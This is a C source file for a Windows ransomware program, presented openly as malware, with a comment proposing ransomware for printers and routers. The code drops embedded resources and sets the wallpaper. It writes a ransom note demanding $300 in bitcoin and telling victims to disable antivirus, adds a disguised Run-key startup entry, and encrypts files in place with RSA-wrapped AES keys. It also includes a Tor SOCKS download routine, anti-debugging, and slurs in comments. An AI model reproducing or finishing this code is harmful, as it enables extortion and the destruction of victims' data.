/* Some Ideas:
Considering how many printers are there :)
A ransomware for printers would be nice :P
Or Routers
I mean like demand money and if they dont pay :) no print and for routers if they dont pay no internet :P
ive made a mini demo for the router so ill release that soon
*/
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_DEPRECATE
#pragma warning( disable: 4995 )
//shitty fucking sprintf warning
#define _UNICODE
#define UNICODE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <sys/stat.h>
#include "dogedolla.h"
#include "hell.h"
#include "resource.h"
#include <windows.h>
#include <wininet.h>
#include <tchar.h>
#include <strsafe.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "User32.lib")
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")
#define bufsizes 1048576
#define MAX_LINE 512
#ifndef MAX_PATHZZ
#define MAX_PATHZZ 256
#endif


bool intconnected() {
	LPWSTR dankmemes = L"http://www.google.com";
	bool dankasf = InternetCheckConnection(dankmemes, FLAG_ICC_FORCE_CONNECTION, 0);
	if (dankasf) {
		//internet connection exists !
		return true;
	}
	else {
		//use hardcoded key?
		return false;
	}
}
typedef struct structreforkey {
	PUBLICKEYSTRUC publickeystruc;
	DWORD          lol;
	BYTE           keysize[16];
} key_hdr;
bool downloadfile()
{
	int sock;
	int dankmeme;
	char brecv[MAX_PATHZZ];
	char header[MAX_PATHZZ * 2];
	WSADATA wsa;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) == 0)
	{


		if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET)
		{
			struct sockaddr_in addr;
			addr.sin_family = AF_INET;
			addr.sin_port = htons(9050);
			addr.sin_addr.s_addr = inet_addr("127.0.0.1");

			printf("Proxy Address+Port = %s:%d\n", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));


			if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0)
			{
				char buff[] =
				{
					0x05,
					0x01,
					0x00
				};


				send(sock, buff, sizeof(buff), 0);
				printf("Sended (%d) = ", sizeof(buff));
				dankmeme = recv(sock, brecv, MAX_PATHZZ, 0);
				if (dankmeme > 0)
				{
					printf("Receved data(%d): ", dankmeme);
					if (brecv[0] != 0x05) {
						printf("Invalid server SOCKS version!\n");
						closesocket(sock);
						WSACleanup();
						return false;
					}

					if (brecv[1] == 0x02) {
						printf("Nigga this wont work u need password!\n");
						closesocket(sock);
						WSACleanup();
						return false;
					}
					if (brecv[1] == 0x00)
					{
						printf("Made dat connection!\n");

						char buff_step_two[MAX_PATHZZ] =
						{
							0x05,
							0x01,
							0x00,
							0x01
						};

						printf("Getting Read to Send Data!!! ^^\n");
						struct hostent *st_hostent;
						struct sockaddr_in addr;
						struct hostent *host;
						//domain
						//removed some code to use tordns and etc ;) :D
						host = gethostbyname("www.twitter.com");
						addr.sin_port = htons(80);
						addr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

						memcpy(buff_step_two + 4, &addr.sin_addr.s_addr, 4);
						memcpy(buff_step_two + 8, &addr.sin_port, 2);

						send(sock, buff_step_two, 10, 0);

						memset(brecv, '\0', MAX_PATHZZ);
						dankmeme = recv(sock, brecv, 10, 0);
						if (dankmeme > 0)
						{

							printf("Receved data(%d): ", dankmeme);
							//note if u change domain then u can also change GET / to GET /yourpage.php
							sprintf(header, "GET / HTTP/1.1\r\n"
								"Host: twitter.com\r\n\r\n");

							printf("\nHeader...\n%s\n", header);
							send(sock, header, strlen(header), 0);
							//secure 0 memory
							RtlSecureZeroMemory(brecv, sizeof(brecv));
							//open file for writing
							FILE * downloadfile = fopen("RADIATION.bin", "wb");
							// i actually checked and verfied to make sure the file was downloaded then returned true
							return true;

							while (recv(sock, brecv, MAX_PATHZZ, 0) > 0) {
								//write to file code here WAS REMOVED!!!
								//lookup how to write to a file, maybe you will learn something
								printf("out...\n%s\n", brecv);

							}
						}
						else {
							closesocket(sock);
							WSACleanup();
							return false;
						}

					}
					else {
						closesocket(sock);
						WSACleanup();
						return false;
					}
				}
				else {
					closesocket(sock);
					WSACleanup();
					return false;
				}
			}
			else {
				closesocket(sock);
				WSACleanup();
				return false;
			}
		}
		else {
			closesocket(sock);
			WSACleanup();
			return false;
		}
	}
	else {
		WSACleanup();
		return false;
	}
}

typedef struct encryptedkeyholder {
	HCRYPTKEY aesencryptedkey;
	BYTE      encryption[256];
} encryptedaes;

void writeransomnote() {
	char first[] = "Q: What's wrong with my files?\nA: Ooops, your important files are encrypted. It means you will not be able to access them anymore until they are decrypted.\nIf you follow our instructions, we guarantee that you can decrypt all your files quickly and safely!\nLet's start decrypting!\nQ: What do I do?\nA: First, you need to pay service fees for the decryption.\nPlease send $300 worth of bitcoin to this bitcoin address BTC 1CryptcfFKJJES1Gh5zAoFtmnPYLCRcMmY\nNext, please find an application file named Decrypter. It is the decrypt software.\nOk follow how to pay the instruction! (You may need to disable your antivirus for a while.)\nQ: How can I trust?\nA: Don't worry about decryption.\nWe will decrypt your files surely because nobody will trust us if we cheat users. you need just pay 1 transaction via bitcoin to specific server our give you how pay instruction to bitcoin Address BTC  1CryptcfFKJJES1Gh5zAoFtmnPYLCRcMmY\n";
	FILE *ransomnote = fopen("decrypt.txt", "wb");
	fprintf(ransomnote, "\n");
	fprintf(ransomnote, first);
	fprintf(ransomnote, "\n");

}
HCRYPTKEY import_rsa_key(HCRYPTPROV prov, const char *file) {
	HCRYPTKEY encryptedkeyholder = 0;
	BYTE twentyfortyeight[2048];
	DWORD lol;
	FILE *filetoopen = fopen(file, "rb");
	if (filetoopen != NULL) {
		lol = fread(twentyfortyeight, 1, 2048, filetoopen);
		if (!CryptImportKey(prov, twentyfortyeight, lol, 0, CRYPT_EXPORTABLE, &encryptedkeyholder)) {
		}
		fclose(filetoopen);
	}
	return encryptedkeyholder;
}
void dumpthersakey(HCRYPTPROV hcryptkeyprov, HCRYPTKEY ransomware_rsakey, const char *filetouse, DWORD okayyy, BOOL encryptionmode) {
	HCRYPTKEY ransomwarekey = 0;
	FILE *outfile;
	BYTE twentyfortyeight[2048];
	BYTE tenandtwentyfour[1024];
	PBYTE lol;
	DWORD okaybud;
	DWORD nolife;
	if (encryptionmode) {
		ransomwarekey = import_rsa_key(hcryptkeyprov, "RADIATION.bin");
		if (ransomwarekey == 0) {
			return;
		}
	}
	outfile = fopen(filetouse, "wb");
	if (outfile != NULL) {
		okaybud = sizeof(twentyfortyeight);
		if (CryptExportKey(ransomware_rsakey, 0, okayyy, 0, twentyfortyeight, &okaybud)) {
			if (encryptionmode) {
				lol = twentyfortyeight;
				while (okaybud) {
					if (okaybud < 245) {
						nolife = okaybud;
					}
					else {
						nolife = 245;
					}
					memcpy(tenandtwentyfour, lol, nolife);
					okaybud -= nolife;
					lol += nolife;
					if (!CryptEncrypt(ransomwarekey, 0, TRUE, 0, tenandtwentyfour, &nolife, sizeof(tenandtwentyfour))) {
						break;
					}
					fwrite(tenandtwentyfour, 1, nolife, outfile);
				}
			}
			else {
				fwrite(twentyfortyeight, 1, okaybud, outfile);
			}
		}
		else {
		}
		fclose(outfile);
	}
	if (ransomwarekey != 0) {
		CryptDestroyKey(encryptionmode);
	}
}
void generateRSAkeys() {
	HCRYPTPROV hcryptprov;
	HCRYPTKEY  hcryptkey;
	if (CryptAcquireContext(&hcryptprov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		if (CryptGenKey(hcryptprov, 1, (2048 << 16) | CRYPT_EXPORTABLE, &hcryptkey)) {
			dumpthersakey(hcryptprov, hcryptkey, "public.memes", PUBLICKEYBLOB, FALSE);
			dumpthersakey(hcryptprov, hcryptkey, "private.memes", PRIVATEKEYBLOB, TRUE); //encrypted private key
			CryptDestroyKey(hcryptkey);
		}
		CryptReleaseContext(hcryptprov, 0);
	}
}
encryptedaes* generateAESKEY(HCRYPTPROV again, HCRYPTKEY rsakey, const char *openfile) {
	encryptedaes* encryptedaeskey = 0;
	key_hdr key;
	FILE  *infile;
	DWORD encryptionmode;
	DWORD lol;
	encryptedaeskey = malloc(sizeof(encryptedaes));
	if (openfile != NULL)
	{
		infile = fopen(openfile, "rb");
		if (infile != NULL) {
			fseek(infile, 15 + sizeof(uint32_t), SEEK_SET);
			/*
			this is just a refernce ^^
			// this will hold the encrypted AES key after
			typedef struct _wc_aes_key_t {
			HCRYPTKEY encryptedkey;
			BYTE      encryption[256];

			*/
			key.lol = fread(encryptedaeskey->encryption, 1, 256, infile);
			if (!CryptDecrypt(rsakey, 0, TRUE, 0, encryptedaeskey->encryption, &key.lol)) {
				return 0;
			}
			memcpy(key.keysize, encryptedaeskey->encryption, 16);
			fclose(infile);
		}
	}
	else {
		CryptGenRandom(again, 16, key.keysize);
		if (encryptedaeskey != 0)
			memcpy(encryptedaeskey->encryption, key.keysize, 16);
		lol = 16;
		if (!CryptEncrypt(rsakey, 0, TRUE, 0, encryptedaeskey->encryption, &lol, 256)) {
			return 0;
		}
	}
	key.publickeystruc.bType = PLAINTEXTKEYBLOB;
	key.publickeystruc.bVersion = CUR_BLOB_VERSION;
	key.publickeystruc.reserved = 0;
	key.publickeystruc.aiKeyAlg = CALG_AES_128;
	key.lol = 16;
	if (CryptImportKey(again, (PBYTE)&key, sizeof(key), 0, CRYPT_NO_SALT, &encryptedaeskey->aesencryptedkey)) {
		//cbc encryption mode... not going to use ECB :D
		encryptionmode = CRYPT_MODE_CBC;
		CryptSetKeyParam(encryptedaeskey->aesencryptedkey, 4, (PBYTE)&encryptionmode, 0);
	}
	return encryptedaeskey;
}
void encrypt(HCRYPTPROV hcryptprov, HCRYPTKEY rsakey, const char *infile)
{
	FILE *openfile;
	FILE *outfile;
	BYTE *buffer;
	DWORD size;
	DWORD keyshit;
	struct __stat64 st;
	encryptedaes *encryptedaeskey;
	openfile = fopen(infile, "rb");
	if (openfile == NULL) return;
	outfile = fopen(infile, "wb");
	if (outfile != NULL) {
		encryptedaeskey = generateAESKEY(hcryptprov, rsakey, NULL);
		if (encryptedaeskey != NULL) {
			buffer = malloc(bufsizes);
			if (buffer != NULL) {
				fwrite("MadeBYKingCobra", 1, 15, outfile);
				keyshit = 256;
				fwrite(&keyshit, 1, sizeof(keyshit), outfile);
				fwrite(encryptedaeskey->encryption, 1, 256, outfile);
				keyshit = 4;
				fwrite(&keyshit, 1, sizeof(keyshit), outfile);
				_stat64(infile, &st);
				fwrite(&st.st_size, 1, sizeof(uint64_t), outfile);
				for (;;) {
					size = fread(buffer, 1, bufsizes - 16, openfile);
					if (size == 0) break;
					if (size<(bufsizes - 16)) {
						memset(&buffer[size], 0, (bufsizes - 16) - size);
						if ((size & 15)) {
							size = (size & -16) + 16;
						}
					}
					CryptEncrypt(encryptedaeskey->aesencryptedkey, 0, FALSE, 0, buffer, &size, bufsizes);
					fwrite(buffer, 1, bufsizes, outfile);
				}
				RtlSecureZeroMemory(buffer, sizeof(buffer));
				free(buffer);
			}
			CryptDestroyKey(encryptedaeskey->aesencryptedkey);
			RtlSecureZeroMemory(encryptedaeskey, sizeof(encryptedaeskey));
			free(encryptedaeskey);
		}
		fclose(outfile);
	}
	fclose(openfile);
}
void fileencryption(const char *infile, int encryptionmode) {
	HCRYPTPROV hcryptprov = 0;
	HCRYPTKEY  rsakey = 0;
	char *key_file;
	if (CryptAcquireContext(&hcryptprov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		key_file = "public.memes";
		rsakey = import_rsa_key(hcryptprov, key_file);
		if (rsakey != 0) {
			encrypt(hcryptprov, rsakey, (const char*)infile);
			CryptDestroyKey(rsakey);
		}
		CryptReleaseContext(hcryptprov, 0);
	}
}
void fuckdaddy(WORD period, LPTSTR periodblood)
{
	HRSRC periodpad = FindResource(NULL, MAKEINTRESOURCE(period), RT_RCDATA);
	HGLOBAL eminemisagod = LoadResource(NULL, periodpad);
	LPVOID legsgiveout = LockResource(eminemisagod);
	DWORD eatanmcsheart = SizeofResource(NULL, periodpad);
	HANDLE checkmymouth = CreateFile(periodblood, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD daddyinthecorner;
	WriteFile(checkmymouth, legsgiveout, eatanmcsheart, &daddyinthecorner, NULL);
	CloseHandle(checkmymouth);
	FreeResource(eminemisagod);
}
int main() {
	////
	//extract resources
	////
	TCHAR  ok[MAX_PATH];
	ExpandEnvironmentStrings(TEXT("%TMP%/memes.jpg"), ok, MAX_PATH - 1);
	WORD lol = IDR_BEEF1;
	LPTSTR ak = ok;
	//gets the res
	fuckdaddy(lol, ak);
	WORD binz = IDR_RADIATION1;
	LPTSTR binzz = _T("RADIATION.bin");
	//gets the res
	fuckdaddy(binz, binzz);
	WORD decrypter = IDR_DECRYPTER1;
	TCHAR  xdddd[MAX_PATH];
	ExpandEnvironmentStrings(TEXT("%TMP%/decrypter.exe"), xdddd, MAX_PATH - 1);
	//gets the res
	LPTSTR odamn = xdddd;
	fuckdaddy(decrypter, odamn);
	//change background
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)ok, SPIF_UPDATEINIFILE);
	//path to cmd
	TCHAR pushmetotheedge[MAX_PATH];
	//get cmd patch and store in pushmetoedge i have to use ExpandString cause i mean idk where the WINDIR is 
	// it might be on fucking D: for all i know
	//change this later to make it "better"
	ExpandEnvironmentStringsW(TEXT("%WINDIR%/System32/cmd.exe"), pushmetotheedge, MAX_PATH - 1);
	STARTUPINFO knowsomeniggas;
	PROCESS_INFORMATION liketoswang;
	ZeroMemory(&knowsomeniggas, sizeof(knowsomeniggas));
	knowsomeniggas.cb = sizeof(knowsomeniggas);
	ZeroMemory(&liketoswang, sizeof(liketoswang));
	//start the decrypter
	CreateProcessW(xdddd, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &knowsomeniggas, &liketoswang);
	writeransomnote();
	//removed injection
	//InjectProcess(GetCurrentProcessId(), "iexplorer.exe");
	//

	//best anti debug in 2017 am i right ;) :D lmaooo
	if (IsDebuggerPresent()) {
		printf("I removed the other anti debug...");
		//removed code to fuck the pc :
	}
	///////////
	//add to startup
	//////////
	DWORD startup = 0;
	startup = GetModuleFileName(NULL, xdddd, MAX_PATH);
	if (startup == 0) {
		return -1;
	}
	HKEY addtostartup;
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &addtostartup) != ERROR_SUCCESS) {
		return -1;
	}
	DWORD pathLenInBytes = startup * sizeof(*xdddd);
	if (RegSetValueEx(addtostartup, TEXT("Microsoft Runtime"), 0, REG_SZ, (LPBYTE)xdddd, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(addtostartup);
		return -1;
	}
	RegCloseKey(addtostartup);
	int encryptionmode = 1;
	generateRSAkeys();
	startRecursion("G:/test", encryptionmode);

	//if (intconnected == false) {
	//just generate them on the client side... this is not good :|

	/*if this failes exit the process and go to self delete exe?
		}
	if (intconnected) {
		while (downloadfile() != true) {
	meh if u want to make a download :\ 	
		downloadfile();
	1000 milliseconds in 1 second? thanks physics ;) :D
	every 2 minutes :P
		Sleep(120000);
		}
	download the keys
		}
	//ugh removed a function :P dont worry about this
	//mbr();
	*/
	//__asm(){
	//removed code for self delete exe

	//}
	return 0;
}
